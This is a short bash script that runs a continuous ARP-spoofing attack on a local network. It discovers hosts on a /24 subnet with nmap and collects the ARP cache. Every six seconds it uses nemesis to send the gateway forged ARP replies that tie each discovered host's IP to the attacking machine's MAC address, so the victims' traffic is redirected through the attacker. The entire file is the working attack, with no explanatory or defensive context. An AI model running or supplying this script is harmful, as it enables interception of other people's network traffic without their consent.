#!/bin/bash
varmac="c8:be:19:8f:1f:3a"	#mac address gateway
gateway="167.13.0.1"		#ip address gateway

while true
do
echo "start... find hosts"
nmap -sn 167.13.0.0/24 |grep for > .tmp
awk -F ' ' '{print $5}' .tmp > .hosts
rm .tmp
echo "ping hosts..."
for ipaddr in `cat .hosts`
	do
	ping -c 1 $ipaddr|grep ping | awk -F ' ' '{print $2}'
	done
ip neigh |grep lladdr|awk -F ' ' '{print $1}' > .arpcache
mip_addr=`ip a |grep enp0s4|grep inet|awk -F ' ' '{print $2}' |awk -F '/' '{print $1}'`
hmac_addr=`ip a |grep -A 1 enp0s4 |grep link |awk -F ' ' '{print $2}'`
cat .arpcache |grep -w -v  $gateway > .tmp
cat .tmp > .arpcache
rm .tmp
echo "inject ip address:"
for addr in `cat .arpcache`
	do
	echo $addr
	sudo nemesis arp -r -d enp0s4 -S $addr -D $gateway -h $hmac_addr -m $varmac -H $hmac_addr -M $varmac 
	done
echo done
echo sleep 6
rm .arpcache
sleep 6
done
